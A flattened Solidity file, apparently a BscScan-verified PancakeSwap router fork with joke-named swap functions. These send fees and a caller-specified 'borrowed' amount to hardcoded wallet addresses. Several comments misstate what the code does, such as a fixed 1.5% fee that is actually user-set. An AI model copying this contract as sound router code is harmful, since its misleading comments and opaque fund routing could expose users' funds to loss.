/**

 *Submitted for verification at BscScan.com on 2023-10-31

*/



/**

 *Submitted for verification at BscScan.com on 2023-10-31

*/



/**

 *Submitted for verification at BscScan.com on 2023-10-30

*/



// File: @uniswap\lib\contracts\libraries\TransferHelper.sol



pragma solidity >=0.6.0;



// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false

library TransferHelper {

    function safeApprove(address token, address to, uint value) internal {

        // bytes4(keccak256(bytes('approve(address,uint256)')));

        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));

        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');

    }



    function safeTransfer(address token, address to, uint value) internal {

        // bytes4(keccak256(bytes('transfer(address,uint256)')));

        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));

        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FAILED');

    }



    function safeTransferFrom(address token, address from, address to, uint value) internal {

        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));

        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));

        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');

    }



    function safeTransferETH(address to, uint value) internal {

        (bool success,) = to.call{value:value}(new bytes(0));

        require(success, 'TransferHelper: ETH_TRANSFER_FAILED');

    }

}



// File: contracts\interfaces\IPancakeRouter01.sol



pragma solidity >=0.6.2;



interface IPancakeRouter01 {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);





    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

}



// File: contracts\interfaces\IPancakeRouter02.sol



pragma solidity >=0.6.2;



interface IPancakeRouter02 is IPancakeRouter01 {

    function SoldMyHouseForETH(

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline



    ) external payable;

    function WifeChangingETH(

        uint amountIn,

        uint amountOutMin,

        address[] calldata path,

        address to,

        uint deadline,

        uint borrowedAmount // Include the borrowed amount as an input



    ) external;

}



// File: contracts\interfaces\IPancakeFactory.sol



pragma solidity >=0.5.0;



interface IPancakeFactory {

    event PairCreated(address indexed token0, address indexed token1, address pair, uint);



    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);



    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);



    function createPair(address tokenA, address tokenB) external returns (address pair);



    function setFeeTo(address) external;

    function setFeeToSetter(address) external;



    function INIT_CODE_PAIR_HASH() external view returns (bytes32);

}



// File: contracts\libraries\SafeMath.sol



pragma solidity =0.6.6;



// a library for performing overflow-safe math, courtesy of DappHub (https://github.com/dapphub/ds-math)



library SafeMath {

    function add(uint x, uint y) internal pure returns (uint z) {

        require((z = x + y) >= x, 'ds-math-add-overflow');

    }



    function sub(uint x, uint y) internal pure returns (uint z) {

        require((z = x - y) <= x, 'ds-math-sub-underflow');

    }



    function mul(uint x, uint y) internal pure returns (uint z) {

        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');

    }

}



// File: contracts\interfaces\IPancakePair.sol



pragma solidity >=0.5.0;



interface IPancakePair {

    event Approval(address indexed owner, address indexed spender, uint value);

    event Transfer(address indexed from, address indexed to, uint value);



    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);



    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);



    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint);



    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;



    event Mint(address indexed sender, uint amount0, uint amount1);

    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);

    event Swap(

        address indexed sender,

        uint amount0In,

        uint amount1In,

        uint amount0Out,

        uint amount1Out,

        address indexed to

    );

    event Sync(uint112 reserve0, uint112 reserve1);



    function MINIMUM_LIQUIDITY() external pure returns (uint);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint);

    function price1CumulativeLast() external view returns (uint);

    function kLast() external view returns (uint);



    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;

    function skim(address to) external;

    function sync() external;



    function initialize(address, address) external;

}



// File: contracts\libraries\PancakeLibrary.sol



pragma solidity >=0.5.0;







library PancakeLibrary {

    using SafeMath for uint;



    // returns sorted token addresses, used to handle return values from pairs sorted in this order

    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {

        require(tokenA != tokenB, 'PancakeLibrary: IDENTICAL_ADDRESSES');

        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);

        require(token0 != address(0), 'PancakeLibrary: ZERO_ADDRESS');

    }



    // calculates the CREATE2 address for a pair without making any external calls

    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {

        (address token0, address token1) = sortTokens(tokenA, tokenB);

        pair = address(uint(keccak256(abi.encodePacked(

                hex'ff',

                factory,

                keccak256(abi.encodePacked(token0, token1)),

                hex'00fb7f630766e6a796048ea87d01acd3068e8ff67d078148a3fa3f4a84f69bd5' // init code hash

            ))));

    }



    // fetches and sorts the reserves for a pair

    function getReserves(address factory, address tokenA, address tokenB) internal view returns (uint reserveA, uint reserveB) {

        (address token0,) = sortTokens(tokenA, tokenB);

        pairFor(factory, tokenA, tokenB);

        (uint reserve0, uint reserve1,) = IPancakePair(pairFor(factory, tokenA, tokenB)).getReserves();

        (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);

    }



    // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset

    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {

        require(amountA > 0, 'PancakeLibrary: INSUFFICIENT_AMOUNT');

        require(reserveA > 0 && reserveB > 0, 'PancakeLibrary: INSUFFICIENT_LIQUIDITY');

        amountB = amountA.mul(reserveB) / reserveA;

    }



    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {

        require(amountIn > 0, 'PancakeLibrary: INSUFFICIENT_INPUT_AMOUNT');

        require(reserveIn > 0 && reserveOut > 0, 'PancakeLibrary: INSUFFICIENT_LIQUIDITY');

        uint amountInWithFee = amountIn.mul(9975);

        uint numerator = amountInWithFee.mul(reserveOut);

        uint denominator = reserveIn.mul(10000).add(amountInWithFee);

        amountOut = numerator / denominator;

    }



    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {

        require(amountOut > 0, 'PancakeLibrary: INSUFFICIENT_OUTPUT_AMOUNT');

        require(reserveIn > 0 && reserveOut > 0, 'PancakeLibrary: INSUFFICIENT_LIQUIDITY');

        uint numerator = reserveIn.mul(amountOut).mul(10000);

        uint denominator = reserveOut.sub(amountOut).mul(9975);

        amountIn = (numerator / denominator).add(1);

    }



    // performs chained getAmountOut calculations on any number of pairs

    function getAmountsOut(address factory, uint amountIn, address[] memory path) internal view returns (uint[] memory amounts) {

        require(path.length >= 2, 'PancakeLibrary: INVALID_PATH');

        amounts = new uint[](path.length);

        amounts[0] = amountIn;

        for (uint i; i < path.length - 1; i++) {

            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i], path[i + 1]);

            amounts[i + 1] = getAmountOut(amounts[i], reserveIn, reserveOut);

        }

    }



    // performs chained getAmountIn calculations on any number of pairs

    function getAmountsIn(address factory, uint amountOut, address[] memory path) internal view returns (uint[] memory amounts) {

        require(path.length >= 2, 'PancakeLibrary: INVALID_PATH');

        amounts = new uint[](path.length);

        amounts[amounts.length - 1] = amountOut;

        for (uint i = path.length - 1; i > 0; i--) {

            (uint reserveIn, uint reserveOut) = getReserves(factory, path[i - 1], path[i]);

            amounts[i - 1] = getAmountIn(amounts[i], reserveIn, reserveOut);

        }

    }

}



// File: contracts\interfaces\IERC20.sol



pragma solidity >=0.5.0;



interface IERC20 {

    event Approval(address indexed owner, address indexed spender, uint value);

    event Transfer(address indexed from, address indexed to, uint value);



    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint);

    function balanceOf(address owner) external view returns (uint);

    function allowance(address owner, address spender) external view returns (uint);



    function approve(address spender, uint value) external returns (bool);

    function transfer(address to, uint value) external returns (bool);

    function transferFrom(address from, address to, uint value) external returns (bool);

}



// File: contracts\interfaces\IWETH.sol



pragma solidity >=0.5.0;



interface IWETH {

    function deposit() external payable;

    function transfer(address to, uint value) external returns (bool);

    function withdraw(uint) external;

}



// File: contracts\PancakeRouter.sol



pragma solidity =0.6.6;





contract IDerpDerp is IPancakeRouter02 {

    using SafeMath for uint;



    address public immutable override factory;

    address public immutable override WETH;



    modifier ensure(uint deadline) {

        require(deadline >= block.timestamp, 'PancakeRouter: EXPIRED');

        _;

    }



    constructor(address _factory, address _WETH) public {

        factory = _factory;

        WETH = _WETH;

    }



    receive() external payable {

        assert(msg.sender == WETH); // only accept ETH via fallback from the WETH contract

    }



    // **** ADD LIQUIDITY ****

    function _addLiquidity(

        address tokenA,

        address tokenB,

        uint amountADesired,

        uint amountBDesired,

        uint amountAMin,

        uint amountBMin

    ) internal virtual returns (uint amountA, uint amountB) {

        // create the pair if it doesn't exist yet

        if (IPancakeFactory(factory).getPair(tokenA, tokenB) == address(0)) {

            IPancakeFactory(factory).createPair(tokenA, tokenB);

        }

        (uint reserveA, uint reserveB) = PancakeLibrary.getReserves(factory, tokenA, tokenB);

        if (reserveA == 0 && reserveB == 0) {

            (amountA, amountB) = (amountADesired, amountBDesired);

        } else {

            uint amountBOptimal = PancakeLibrary.quote(amountADesired, reserveA, reserveB);

            if (amountBOptimal <= amountBDesired) {

                require(amountBOptimal >= amountBMin, 'PancakeRouter: INSUFFICIENT_B_AMOUNT');

                (amountA, amountB) = (amountADesired, amountBOptimal);

            } else {

                uint amountAOptimal = PancakeLibrary.quote(amountBDesired, reserveB, reserveA);

                assert(amountAOptimal <= amountADesired);

                require(amountAOptimal >= amountAMin, 'PancakeRouter: INSUFFICIENT_A_AMOUNT');

                (amountA, amountB) = (amountAOptimal, amountBDesired);

            }

        }

    }



    // **** SWAP (supporting fee-on-transfer tokens) ****

    // requires the initial amount to have already been sent to the first pair

    function _swapSupportingFeeOnTransferTokens(address[] memory path, address _to) internal virtual {

        for (uint i; i < path.length - 1; i++) {

            (address input, address output) = (path[i], path[i + 1]);

            (address token0,) = PancakeLibrary.sortTokens(input, output);

            IPancakePair pair = IPancakePair(PancakeLibrary.pairFor(factory, input, output));

            uint amountInput;

            uint amountOutput;

            { // scope to avoid stack too deep errors

            (uint reserve0, uint reserve1,) = pair.getReserves();

            (uint reserveInput, uint reserveOutput) = input == token0 ? (reserve0, reserve1) : (reserve1, reserve0);

            amountInput = IERC20(input).balanceOf(address(pair)).sub(reserveInput);

            amountOutput = PancakeLibrary.getAmountOut(amountInput, reserveInput, reserveOutput);

            }

            (uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0));

            address to = i < path.length - 2 ? PancakeLibrary.pairFor(factory, output, path[i + 2]) : _to;

            pair.swap(amount0Out, amount1Out, to, new bytes(0));

        }

    }

function setFee(uint _levfee) external {

    require(_levfee <= 1000, "Fee cannot be more than 100%"); // Ensure the fee is not more than 100%

    userFees[msg.sender] = _levfee;

}



    // Mapping of user addresses to fees

mapping(address => uint) public userFees;



function SoldMyHouseForETH(

    uint amountOutMin,

    address[] calldata path,

    address to,

    uint deadline

)

    external

    virtual

    override

    payable

    ensure(deadline)

{

    uint levfee = userFees[msg.sender];  // Retrieve the fee for the user



    require(path[0] == WETH, 'PancakeRouter: INVALID_PATH');

    uint amountIn = msg.value;

    

    // Calculate the fee amount (1.5% of the incoming ETH)

    uint feeAmount = (amountIn * levfee) / 1000; // 1.5% fee



    // Calculate the amount to be swapped after deducting the fee

    uint amountToSwap = amountIn - feeAmount;



    // Deposit the remaining amount into WETH

    IWETH(WETH).deposit{value: amountToSwap}();

    assert(IWETH(WETH).transfer(PancakeLibrary.pairFor(factory, path[0], path[1]), amountToSwap));



    // Perform the swap and transfer in the same transaction

    uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);

    _swapSupportingFeeOnTransferTokens(path, to);

    uint balanceAfter = IERC20(path[path.length - 1]).balanceOf(to);



    // Calculate the actual received amount after the swap

    uint receivedAmount = balanceAfter - balanceBefore;



    // Ensure that the received amount meets the minimum required

    require(receivedAmount >= amountOutMin, 'PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT');

    

    // Transfer the fee to the fee wallet address

    address feeWallet = 0x5223A954Dd6BC477ACb75d1361101780d91740eE; // Replace with your actual fee wallet address

    payable(feeWallet).transfer(feeAmount);

}

    

 // State variable to store total fees

uint public totalFees;



function WifeChangingETH( uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline, uint borrowedAmount ) external virtual override ensure(deadline) {

    require(path[path.length - 1] == WETH, 'PancakeRouter: INVALID_PATH');

    TransferHelper.safeTransferFrom( path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amountIn );

    _swapSupportingFeeOnTransferTokens(path, address(this));

    uint amountOut = IERC20(WETH).balanceOf(address(this));

    

    // Calculate the remaining user amount after repaying the borrowed amount

    uint userAmount = amountOut - borrowedAmount;

    

    // Calculate the 1.5% fee after borrowed amount is transferred

    uint postBorrowedFee = (userAmount * 15) / 1000;

    

    // Adjust the user amount after deducting the post borrowed fee

    userAmount = userAmount - postBorrowedFee;

    

    // Check that the user amount is not less than a minimum specified amount

    require(userAmount >= amountOutMin, 'PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT');

    

    // Add the fee to the total fees

    totalFees += postBorrowedFee;

    

    // Withdraw and transfer the remaining user amount

    IWETH(WETH).withdraw(userAmount);

    TransferHelper.safeTransferETH(to, userAmount);

    

    // Withdraw and transfer the post borrowed fee

    IWETH(WETH).withdraw(postBorrowedFee);

    TransferHelper.safeTransferETH(0x5223A954Dd6BC477ACb75d1361101780d91740eE, postBorrowedFee);

    

    // Withdraw and transfer the borrowed amount

    IWETH(WETH).withdraw(borrowedAmount);

    TransferHelper.safeTransferETH(0xB18ecF324A54Faaefc003565338DfeaC26BAc4aE, borrowedAmount);

}



// Getter function to read total fees

function getTotalFees() public view returns (uint) {

    return totalFees;

}





    





    // **** LIBRARY FUNCTIONS ****

    function quote(uint amountA, uint reserveA, uint reserveB) public pure virtual override returns (uint amountB) {

        return PancakeLibrary.quote(amountA, reserveA, reserveB);

    }



    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)

        public

        pure

        virtual

        override

        returns (uint amountOut)

    {

        return PancakeLibrary.getAmountOut(amountIn, reserveIn, reserveOut);

    }



    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut)

        public

        pure

        virtual

        override

        returns (uint amountIn)

    {

        return PancakeLibrary.getAmountIn(amountOut, reserveIn, reserveOut);

    }



    function getAmountsOut(uint amountIn, address[] memory path)

        public

        view

        virtual

        override

        returns (uint[] memory amounts)

    {

        return PancakeLibrary.getAmountsOut(factory, amountIn, path);

    }



    function getAmountsIn(uint amountOut, address[] memory path)

        public

        view

        virtual

        override

        returns (uint[] memory amounts)

    {

        return PancakeLibrary.getAmountsIn(factory, amountOut, path);

    }

}